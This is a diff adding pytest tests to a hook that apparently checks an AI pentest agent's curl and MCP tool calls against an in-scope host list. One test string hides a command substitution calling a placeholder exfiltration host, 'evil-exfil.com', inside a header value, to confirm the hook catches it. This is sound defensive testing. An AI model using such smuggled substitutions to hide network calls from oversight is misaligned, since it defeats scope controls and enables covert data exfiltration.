@@ -145,6 +145,73 @@ def test_extract_hosts_from_bash_curl_exempts_attacker_origin_placeholder():
     assert hosts == ["realtarget-corp.com"]
 
 
+def test_extract_hosts_from_bash_does_not_flag_real_domain_in_header_value():
+    """Regression test reported live across engagement retrospectives: a
+    genuine (non-placeholder) domain in a header VALUE -- e.g. a Host-
+    header-injection test's -H "X-Forwarded-Host: internal.example.org" --
+    was still flagged as a second host requiring its own in_scope entry,
+    even though it's data being sent, not the request's actual
+    destination. Only realtarget-corp.com (the actual curl target) should
+    be extracted."""
+    hosts = hook._extract_hosts_from_bash(
+        'curl https://realtarget-corp.com/api -H "X-Forwarded-Host: internal.example.org"'
+    )
+    assert hosts == ["realtarget-corp.com"]
+    assert "internal.example.org" not in hosts
+
+
+def test_extract_hosts_from_bash_does_not_flag_full_url_inside_header_value():
+    """Same false-positive class as above, but the header value is a full
+    URL (e.g. a Referer header for an open-redirect/CSRF PoC) rather than a
+    bare hostname -- URL_RE itself would otherwise match it directly as if
+    it were the request's real target."""
+    hosts = hook._extract_hosts_from_bash(
+        'curl https://realtarget-corp.com/api -H "Referer: https://otherdomain.com/page"'
+    )
+    assert hosts == ["realtarget-corp.com"]
+    assert "otherdomain.com" not in hosts
+
+
+def test_extract_hosts_from_bash_still_flags_out_of_scope_url_target():
+    """The header-value fix must not swallow a genuine out-of-scope
+    request target -- only the flag's OWN argument value is blanked, not
+    the rest of the command."""
+    hosts = hook._extract_hosts_from_bash(
+        'curl https://out-of-scope-corp.com/api -H "X-Custom: some-value"'
+    )
+    assert hosts == ["out-of-scope-corp.com"]
+
+
+def test_extract_hosts_from_bash_catches_command_substitution_inside_header_value():
+    """Code-review finding #1: HEADER_VALUE_RE blanks a flag's WHOLE
+    argument value before URL_RE/HOSTNAME_RE ever run -- including a
+    command substitution smuggled inside it. `-H "X-Forwarded-Host:
+    $(curl evil-exfil.com/x)"` is a REAL network call hidden inside what
+    looks like inert header data; blanking it entirely hid that call from
+    this hook's own scope check. A header value containing `$(` must be
+    left exposed to normal host extraction instead of blanked."""
+    hosts = hook._extract_hosts_from_bash(
+        'curl https://realtarget-corp.com/api -H "X-Forwarded-Host: $(curl evil-exfil.com/x)"'
+    )
+    assert "evil-exfil.com" in hosts
+    assert "realtarget-corp.com" in hosts
+
+
+def test_extract_hosts_from_bash_still_flags_host_header_value_as_a_target():
+    """Code-review finding #2: a `Host:` header's value is not inert data
+    being SENT -- for vhost-routed backends it IS the effective
+    destination (`curl https://allowed-corp.com -H "Host:
+    internal-admin.example.org"` connects to allowed-corp.com's IP but
+    routes to internal-admin.example.org's vhost). The blanket header-
+    value exemption must carve the literal Host header name out so its
+    value still reaches normal host extraction."""
+    hosts = hook._extract_hosts_from_bash(
+        'curl https://allowed-corp.com/api -H "Host: internal-admin.example.org"'
+    )
+    assert "internal-admin.example.org" in hosts
+    assert "allowed-corp.com" in hosts
+
+
 def test_mcp_server_name_parses_correctly():
     assert hook._mcp_server_name("mcp__httpx-mcp__screenshot_hosts") == "httpx-mcp"
     assert hook._mcp_server_name("Bash") == ""
@@ -808,6 +875,24 @@ def test_main_gates_obscura_mcp(monkeypatch):
     # documented-convention one.
     payload = {"tool_name": "mcp__obscura-mcp__browser_navigate", "tool_input": {"url": "https://realtarget-corp.com"}}
     assert _run_main(monkeypatch, payload) == 2
+
+
+def test_main_gates_ws_rpc_mcp_call_ddp_method(monkeypatch):
+    # ws-rpc-mcp's call_ddp_method(url, ...) sends a real WebSocket
+    # connection to the live target, same live-target-touching role as
+    # idor-mcp -- must get the same structural scope-gate.
+    payload = {"tool_name": "mcp__ws-rpc-mcp__call_ddp_method",
+               "tool_input": {"url": "wss://realtarget-corp.com/websocket", "method": "getUserProfile"}}
+    assert _run_main(monkeypatch, payload) == 2
+
+
+def test_main_does_not_gate_ws_rpc_mcp_enumerate_ddp_methods(monkeypatch):
+    # enumerate_ddp_methods(js_file_path) is local-file-only (no
+    # HOST_ARG_KEYS-matching arg) -- whole-server Tier-2 registration must
+    # not force a scope check onto a call that carries no host candidate.
+    payload = {"tool_name": "mcp__ws-rpc-mcp__enumerate_ddp_methods",
+               "tool_input": {"js_file_path": "/tmp/downloaded/app.min.js"}}
+    assert _run_main(monkeypatch, payload) == 0
 
 
 @pytest.mark.parametrize("tool_name", ["WebFetch", "webfetch"])
